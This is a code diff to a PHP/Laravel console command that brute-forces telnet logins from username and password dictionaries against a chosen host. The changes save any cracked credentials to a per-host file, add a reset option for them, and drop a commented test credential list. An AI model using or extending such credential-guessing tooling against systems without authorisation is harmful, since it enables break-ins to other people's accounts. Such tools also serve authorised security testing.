@@ -33,6 +33,7 @@ class TelnetBruteForceDictionary extends Command
      {--full_line_timeout=0.10 : The maximum time to wait for before assuming the line is not carriage return terminated.}
      {--debug : output more information in laravel.log. }
      {--reset : reset the saved values. Restart from the first username and password again.}
+     {--resetFound : reset only the username and password saved previously identified as correct by the program. It does not reset the progress saved by dictionary.}
      {--userDb= : Path to users list.}
      {--passDb= : Path to the passwords list.}
      {--tag=0 : If more than one instance is running, different files saved ex: 0_password_cursors.txt, 1_password_cursors.txt}';
@@ -80,6 +81,12 @@ class TelnetBruteForceDictionary extends Command
     private $passDbCursorSavedPath;
 
     /**
+     * To saved the record when password was found.
+     * string $passwordFoundPath
+     */
+    private $passwordFoundPath;
+
+    /**
      * Execute the console command.
      *
      * @return int
@@ -90,6 +97,17 @@ class TelnetBruteForceDictionary extends Command
         $host = $this->option('host');
         $this->userDbCursorSavedPath = "telnet_brute_force_dict/$host/{$tag}_users_cursor.txt";
         $this->passDbCursorSavedPath = "telnet_brute_force_dict/$host/{$tag}_passwords_cursor.txt";
+        $this->passwordFoundPath     = "telnet_brute_force_dict/$host/{$tag}_password_found.txt";
+
+        if($this->option('resetFound')) {
+           Storage::delete($this->passwordFoundPath);
+        }
+
+        $passwordFound = Storage::get($this->passwordFoundPath);
+        if(!is_null($passwordFound)) {
+            $this->info("credentials found: $passwordFound");
+            return Command::SUCCESS;
+        }
 
         $options = Arr::only($this->options(), ['host', 'port', 'host', 'connect_timeout', 'socket_timeout', 'full_line_timeout']);
 
@@ -146,6 +164,7 @@ class TelnetBruteForceDictionary extends Command
             $this->info("Found progress saved for passDb using: index $this->passDbCursor.");
         }
 
+
         $telnet = new TelnetService(...$options);
         $telnet->setNextUsernamePasswordFromDictCallback([$this, "nextUsernamePassword"]);
         $telnet->setInfoLogCallback([$this, 'info']);
@@ -156,7 +175,10 @@ class TelnetBruteForceDictionary extends Command
         }
         $start = now();
         if($telnet->bruteForceWithDictionary()) {
+            $username = $this->userDb[$this->userDbCursor] ?? "no-username-found";
+            $password = $this->passDb[$this->passDbCursor - 1] ?? "no-password-found";
             $this->info("credentials found");
+            Storage::put($this->passwordFoundPath, "$username:$password");
             return Command::SUCCESS;
         }
         $time = $start->diffInSeconds(now());
@@ -214,19 +236,4 @@ class TelnetBruteForceDictionary extends Command
     }
 
 
-
-//    public function nextUsernamePassword()
-//    {
-//
-//        $data = [
-//            ["username" => "hello", "password" => "password"],
-//            ["username" => "telnet", "password" => "weak"],
-//            ["username" => "john", "password" => "123456"],
-//            ["username" => "yunior", "password" => "ycm11"],
-//            ["username" => "root", "password" => "founder88"]
-//        ];
-//        $credentials = $data[$this->dictCursor]?? [];
-//        $this->dictCursor++;
-//        return $credentials;
-//    }
 }
